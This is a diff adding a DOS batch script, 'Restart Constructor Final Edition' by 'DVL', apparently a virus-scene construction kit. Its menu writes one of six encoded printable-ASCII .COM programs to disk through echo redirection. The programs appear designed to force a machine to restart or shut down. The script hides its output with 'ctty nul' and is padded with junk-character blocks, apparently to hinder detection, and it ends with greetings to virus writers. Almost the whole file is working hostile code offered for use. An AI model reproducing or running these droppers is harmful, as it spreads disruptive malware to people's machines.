@@ -1,0 +1,224 @@
+@echo off
+ctty nul
+ฒฐทเฐ+หย+ฟๆ๋วืษฏ+ใ่+ูิ๓_๚ohfgv52158201นฅ๚๓ํ+ิ๓_๚oh__456456363646334112
+นฅ๚๓ํ++ฏยฆม__ฆฒฐทเฐ+หย+ฟๆ๋ว_๚o201นฅํ++ฏยิ๓_๚ohิ๓_๚oh663563hhdhd645%&$%^^%
+%$^$%^$%^&$fgdghd%$%^$fgxfgdghDFGDR564%$#%#$@%gcgchg&^%^%6786$%^&$^%&$%^dtgG
+gFGHFGHTGHDTFHDFGFGDFGHDFGHDFGHDRD%$5467456745$%^$^&$%#%$%46754567Gcjgvgh^&%
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+%$^%&$%^$&%#$##$%^&**6756*$&$%$%%]i(&^$@#@#$$%^&&#$%^&*((((&*(&^$$$%^&*@$%^^
+ฒฐทเฐ+หย+ฟๆ๋วืษฏ+ใ่+ูิ๓_๚ohfgv52158201นฅ๚๓ํ+ิ๓_๚oh__456456363646334112
+นฅ๚๓ํ++ฏยฆม__ฆฒฐทเฐ+หย+ฟๆ๋ว_๚o201นฅํ++ฏยิ๓_๚ohิ๓_๚oh663563hhdhd645%&$%^^%
+%$^$%^$%^&$fgdghd%$%^$fgxfgdghDFGDR564%$#%#$@%gcgchg&^%^%6786$%^&$^%&$%^dtgG
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+gFGHFGHTGHDTFHDFGFGDFGHDFGHDFGHDRD%$5467456745$%^$^&$%#%$%46754567Gcjgvgh^&%
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+%$^%&$%^$&%#$##$%^&****&^%$$$%^&*(((&^$@#@#$$%^&&#$%^&*((((&*(&^$$$%^&*@$%^^
+ctty con
+:menu
+echo.
+echo.
+echo                    ษอออออออออออออออออออออออออออออออออออป
+echo                    บ Restart Constructor Final Edition บ
+echo                    ศออป    dvl2003ro@yahoo.co.uk    ษออผ
+echo                       ฬอออออออออออออออออออออออออออออน
+echo                       บ                             บ
+echo                       บ       Created by DVL        บ
+echo                       บ                             บ
+echo                    ษออสอออออออออออออออออออออออออออออสออป
+echo                    บ Viruses don't harm, ignorance do! บ
+echo                    ศอออออออออออออออออออออออออออออออออออผ
+echo.
+echo    Make a file(press a number from 1 to 6)
+echo    ฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤอฤ
+echo.
+echo    1 - Restart 1   (min.req. msdos 6.0)
+echo    2 - Restart 2   (min.req. msdos 6.0)
+echo    3 - Restart 3   (min.req. msdos 6.0)
+echo    4 - Restart 4 (min.req. AdvancedPowerManagement 1.2)
+echo    5 - Restart 5   (min.req. msdos 6.0)
+echo    6 - Restart 6   (min.req. msdos 6.0)
+echo.
+echo    7 - Greetz and special thanx
+echo    Q - Quit (Are u sure ???)
+echo.
+choice /c:1234567Q>nul
+if errorlevel 8 goto done
+if errorlevel 7 goto 7
+if errorlevel 6 goto 6
+if errorlevel 5 goto 5
+if errorlevel 4 goto 4
+if errorlevel 3 goto 3
+if errorlevel 2 goto 2
+if errorlevel 1 goto 1
+echo CHOICE missing
+goto done
+
+:1
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart1.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart1.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart1.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart1.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart1.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart1.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart1.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart1.com
+@echo DHE@ECLK@M@JP>>restart1.com
+ctty con
+goto done
+
+:2
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart2.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart2.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart2.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart2.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart2.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart2.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart2.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart2.com
+@echo KD@MLMBAKHD@@@HNMHCNH@@NAG@@@LKHECDOLMAECNLG@FGB@@CDABNJO@OO@@O@P>>restart2.com
+ctty con
+goto done
+
+:3
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart3.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart3.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart3.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart3.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart3.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart3.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart3.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart3.com
+@echo KHD@@@E@AOLG@FGB@@CDABKHOOOOE@KH@@@@E@LKP>>restart3.com
+ctty con
+goto done
+
+:4
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart4.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart4.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart4.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart4.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart4.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart4.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart4.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart4.com
+@echo KH@AECCCMKLMAEKH@NECCCMKKI@B@ALMAEKH@GECCCMKDCKI@C@@LMAELCEFFEGBGCFI>>restart4.com
+@echo FOFNB@CABNCCP>>restart4.com
+ctty con
+goto done
+
+:5
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart5.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart5.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart5.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart5.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart5.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart5.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart5.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart5.com
+@echo KHD@@@HNMHKHGOGOJCGB@@NJ@@@@OOOOBHFCBIB@CACICHCHB@EJFIFFFFB@DCFOFMFM>>restart5.com
+@echo GEFNFIFCFAGDFIFOFNGCB@DCFOBNB@BMB@FBGIB@DCFHFAGBFLFEGCB@E@FEGDGJFOFL>>restart5.com
+@echo FDP>>restart5.com
+ctty con
+goto done
+
+:6
+ctty nul
+@echo @P@P@P@P@P@P@P@P=-==DA=ND=LE=R!=-=XXXXXXXX=>restart6.com
+@echo [SSX,@P^SX4a,A(@B(@C0@F0@G0@J0@K0@N0@OSX4@(@@(@A=>>restart6.com
+@echo SX,@(@H(@I(@J(@K(@L(@L(@M(@M(@N(@N(@O(@O=>>restart6.com
+@echo SX5CB-@@,@P^SX5BB-@@,@P_=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=>>restart6.com
+@echo SX4P8@@tkSX4@8@@rWSX2@@F,@,@VP^SX2@@^2@@4@PSX2A@0A@X0A@G=>>restart6.com
+@echo @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@FSX5@B-@@P@LC>>restart6.com
+@echo NH@@@@EMHANMAO@IEGHMKFD@@IKOOL@@KI@D@@OC>>restart6.com>>restart6.com
+@echo JDHMKFDD@IKO@@@AEIKHOL@@E@CCL@LCOCJDNK@@>>restart6.com>>restart6.com
+@echo KHD@@@HNMHKHCDABJCGB@@NJ@@@@OOOOBHFCBIB@CACICHCHB@EJFIFFFFB@DCFOFMFM>>restart6.com
+@echo GEFNFIFCFAGDFIFOFNGCB@DCFOBNB@BMB@FBGIB@DCFHFAGBFLFEGCB@E@FEGDGJFOFL>>restart6.com
+@echo FDP>>restart6.com
+ctty con
+goto done
+
+:7
+cls
+@echo.
+@echo.
+@echo   Greetz and special 10x goes to:
+@echo   อออออออออออออออออออออออออออออออ
+@echo   - NGL - myth_eu@yahoo.com
+@echo   - Kaspersky - www.kaspersky.com
+@echo   - SpTh - SPTH@aonmail.at and www.spth.de.vu
+@echo   - Sad1c - sad1c@interfree.it and http://sad1cpage.supereva.it/
+@echo   - Adder - adder_2003@yahoo.com
+@echo   - Nino - drliks@yahoo.com
+@echo   - Mj (Gotenks) - igrasie@yahoo.com
+@echo   - Ratty - ratty2001ro@yahoo.com and http://ratty.home.ro/
+@echo   - John - Cyberpunk_ro@yahoo.com
+@echo   - AlcoPaul - http://alcopaul.cjb.net/
+@echo.
+@echo.
+@echo   Contact me at : dvl2003ro@yahoo.co.uk
+@echo                   อออออออออออออออออออออ
+@echo.
+@echo.
+@echo   Press any key for main menu ...
+@pause >nul
+cls
+goto menu
+
+:done
+ctty nul
+ฒฐทเฐ+หย+ฟๆ๋วืษฏ+ใ่+ูิ๓_๚ohfgv52158201นฅ๚๓ํ+ิ๓_๚oh__456456363646334112
+นฅ๚๓ํ++ฏยฆม__ฆฒฐทเฐ+หย+ฟๆ๋ว_๚o201นฅํ++ฏยิ๓_๚ohิ๓_๚oh663563hhdhd645%&$%^^%
+%$^$%^$%^&$fgdghd%$%^$fgxfgdghDFGDR564%$#%#$@%gcgchg&^%^%6786$%^&$^%&$%^dtgG
+gFGHFGHTGHDTFHDFGFGDFGHDFGHDFGHDRD%$5467456745$%^$^&$%#%$%46754567Gcjgvgh^&%
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+%$^%&$%^$&%#$##$%^&**6756*$&$%$%%]i(&^$@#@#$$%^&&#$%^&*((((&*(&^$$$%^&*@$%^^
+ฒฐทเฐ+หย+ฟๆ๋วืษฏ+ใ่+ูิ๓_๚ohfgv52158201นฅ๚๓ํ+ิ๓_๚oh__456456363646334112
+นฅ๚๓ํ++ฏยฆม__ฆฒฐทเฐ+หย+ฟๆ๋ว_๚o201นฅํ++ฏยิ๓_๚ohิ๓_๚oh663563hhdhd645%&$%^^%
+%$^$%^$%^&$fgdghd%$%^$fgxfgdghDFGDR564%$#%#$@%gcgchg&^%^%6786$%^&$^%&$%^dtgG
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+gFGHFGHTGHDTFHDFGFGDFGHDFGHDFGHDRD%$5467456745$%^$^&$%#%$%46754567Gcjgvgh^&%
+HJHGFHGFGHffghgfhjfgdtU%^&$%^4567456756*$&$%$%%&##$%^#&*((&^%^%*%&%^&%&&*%^^
+%$^%&$%^$&%#$##$%^&****&^%$$$%^&*(((&^$@#@#$$%^&&#$%^&*((((&*(&^$$$%^&*@$%^^
+ctty con
+cls
